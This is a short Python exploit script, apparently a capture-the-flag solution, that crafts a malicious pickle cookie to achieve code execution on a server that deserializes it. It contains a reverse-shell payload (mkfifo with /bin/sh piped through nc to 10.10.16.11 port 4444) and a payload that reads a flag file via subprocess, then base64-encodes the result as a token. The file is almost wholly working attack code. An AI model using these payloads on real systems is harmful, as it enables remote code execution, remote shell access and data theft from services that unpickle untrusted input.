# WARNING: py3 doesn't work properly

import base64
import os
import pickle
import subprocess


class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 10.10.16.11 4444 > /tmp/f')
        return os.system, (cmd,)


if __name__ == '__main__':
    # First, we need to figure out the class name and payload looks like {'serum': xxx}
    # class anti_pickle_serum:
    #     def __init__(self):
    #         pass

    class anti_pickle_serum(object):
        def __reduce__(self):
            # STEP1: find out files
            # return subprocess.check_output, (['ls', '-la',],)
            # STEP2: dump flag
            return subprocess.check_output, (['cat', 'flag_wIp1b',],)


    # Cookie we got
    # cookie_plan_b = 'KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu' 
    # print(pickle.loads(base64.b64decode(cookie_plan_b)))

    # play with protocol arg -> '0' means its human-readable
    pickled = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
    token_to_exploit = base64.b64encode(pickled)
    print(token_to_exploit)
    # print(pickle.loads(base64.b64decode(token_to_exploit)))

